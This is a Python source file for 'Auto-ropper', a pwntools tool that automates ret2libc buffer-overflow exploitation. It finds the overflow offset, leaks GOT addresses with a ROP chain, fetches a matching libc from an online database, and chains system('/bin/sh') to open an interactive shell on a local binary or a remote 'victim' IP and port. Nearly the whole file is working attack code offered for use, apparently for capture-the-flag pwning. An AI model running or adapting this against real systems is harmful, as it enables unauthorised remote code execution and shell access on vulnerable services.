from pwn import *
import requests
from bs4 import BeautifulSoup
import os
import shutil
import argparse

#context.log_level = 'debug'

class Exploit:
	def __init__(self, binary, ip=None, port=None, arch="amd64"):
		self.ip = ip 
		self.port = port
		self.elf = ELF(binary)
		self.offset_leaking = self.elf.process()
		self.rop = ROP(self.elf)
		self.url_find_libc = "https://libc.blukat.me/?q="
		self.url_download_libc = "https://libc.blukat.me/d/"
		os.path.join(os.getcwd(), "libc")
		if self.ip is not None and self.port is not None:
			try:
				self.p = remote(self.ip,self.port)
			except:
				log.warning("Couldn't connect... Aborting.")
				exit(-1)
		else:
			self.p = self.elf.process()
		context.arch = arch

	def recovery(self, instance, message, *args, exception=Exception, callback=lambda: None):
		try:
			instance.call(*args)
		except exception:
			log.warning(message)
			callback()

	def offset_finder(self, offset_leaking):
		offset_leaking = offset_leaking
		offset = b""
		if offset == b"":
			log.info("Searching for offset")
			self.offset_leaking.sendline(cyclic(516,n=8))
			self.offset_leaking.wait()
			core = Coredump('./core')
			offset = cyclic_find(core.read(core.rsp,8),n=8)
			log.info(f"Offset is {offset}")
		return offset

	def payload_generator(self, instance, offset):
		payload = [
			b"A"*offset,
			instance.chain()
		]
		payload = b"".join(payload)
		if instance == self.rop:
			if len(payload) % 16 != 0:
				log.info("Payload not aligned... Aligning it.")
				rop2 = ROP(self.elf)
				available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
				for func in available_funcs:
					self.recovery(rop2,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
				self.recovery(rop2, "Couldn't find ret", rop2.find_gadget(["ret"])[0])
				self.recovery(rop2,f"No main found...", self.elf.symbols["main"])
				payload2 = [
					b"A"*offset,
					rop2.chain()
				]
				payload2 = b"".join(payload2)
				return payload2
		else:
			if len(payload) % 16 != 0:
				self.recovery(self.roplibc, "Couldn't find ret", self.roplibc.find_gadget(["ret"]))
				self.recovery(self.roplibc, "Didn't found system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
				self.recovery(self.roplibc,"Didn't found exit...","exit")
				payload2 = [
					b"A"*offset,
					self.roplibc.chain()
				]
				payload2 = b"".join(payload2)
				return payload2

		return payload

	def join_cwd(self, path):
		return os.path.join(os.getcwd(), path)

	def main(self):
		offset = self.offset_finder(self.offset_leaking)
		#self.p.sendline(b"")
		self.p.recvline()
		log.info("Leaking available address...")

		available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
		for func in available_funcs:
			self.recovery(self.rop,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
		self.recovery(self.rop,f"No main found...", self.elf.symbols["main"])
		payload1 = self.payload_generator(self.rop,offset)
		self.p.sendline(payload1)
		leaked_addr_list = []
		#self.p.interactive()
		self.p.recv()

		for name in available_funcs: 
			leaked = u64(self.p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
			log.info(f"{name} @ {hex(leaked)}")
			name_leaked = name+":"+hex(leaked)
			leaked_addr_list.append(name_leaked)
		
		log.info("Looking for a libc...")
		leaked_addr = ",".join(leaked_addr_list)
		page = requests.get(self.url_find_libc+leaked_addr)
		soup = BeautifulSoup(page.content,"html.parser")
		scrap = soup.find(class_="lib-item")
		if scrap == None:
			log.warning("Libc not found... Aborting")
			exit(-1)
		libc_found = "".join(scrap.text.split()) + ".so"
		log.info("Found a LIBC that could work (found it on https://libc.blukat.me/).")
		log.info("Testing with following LIBC: " + libc_found)
		
		if libc_found != "":
			if (libc_found) not in os.listdir('./libc/'):
				log.info("Downloading libc... Could take some time depending of your internet")
				req = requests.get(self.url_download_libc+libc_found, allow_redirects=True)
				open(libc_found,'wb').write(req.content)
				LIBC = "./libc/" + str(libc_found)
				src = self.join_cwd(libc_found)
				to = self.join_cwd(os.path.join("libc", libc_found))
				shutil.move(src, to)
			else:
				log.info('LIBC already downloaded previously')
				LIBC = "./libc/" + str(libc_found)
			if LIBC:
				self.libc = ELF(LIBC) 
				self.libc.address = leaked - self.libc.symbols[available_funcs[-1]]
				log.info(f"base libc @ {hex(self.libc.address)}")
		else:
			log.warning("Couldn't find LIBC... Aborting.")
			exit(-1)

		self.roplibc = ROP(self.libc)
		self.recovery(self.roplibc, "Didn't found system...","system",[ next(self.libc.search(b"/bin/sh\x00")) ])
		self.recovery(self.roplibc,"Didn't found exit...","exit")

		payload2 = self.payload_generator(self.roplibc, offset)

		self.p.sendline(payload2)
		self.p.interactive()

class Gui(): 
	def __init__(self):
		pass

	def gui():
		pass

if __name__ == "__main__":
	parser = argparse.ArgumentParser(
		description='Auto-ropper is a tool that aims to automate the exploitation of ROP.'
		)

	mode = parser.add_subparsers(title="mode")

	local_attack = mode.add_parser("local", parents=[parser], add_help=False, description="For local pwning")
	local_attack.set_defaults(which="local")
	local_attack.add_argument("-b","--binary",help="path to binary")
	
	remote_attack = mode.add_parser("remote", parents=[parser], add_help=False, description="For remote pwning")
	remote_attack.add_argument("-b","--binary",help="path to binary")
	remote_attack.add_argument("-i","--ip",help="ip of remote victim")
	remote_attack.add_argument("-p","--port",help="port of remote victim")
	remote_attack.set_defaults(which="remote")

	gui = mode.add_parser("gui", parents=[parser], add_help=False, description="Launch GUI")
	gui.set_defaults(which="gui")

	args = parser.parse_args()

	if args.which == "local":
		if not args.binary:
			log.warning("No binary given... Please provide one.")
		else:
			local_exploit = Exploit(args.binary)
			local_exploit.main()

	if args.which == "remote":
		if not args.binary and not args.ip and not args.port:
			log.warning("Please verify that you gave the binary path, the ip and port for a remote attack.")
		else:
			remote_exploit = Exploit(args.binary, args.ip, int(args.port))
			remote_exploit.main()

	if args.which == "gui":
		print("gui")
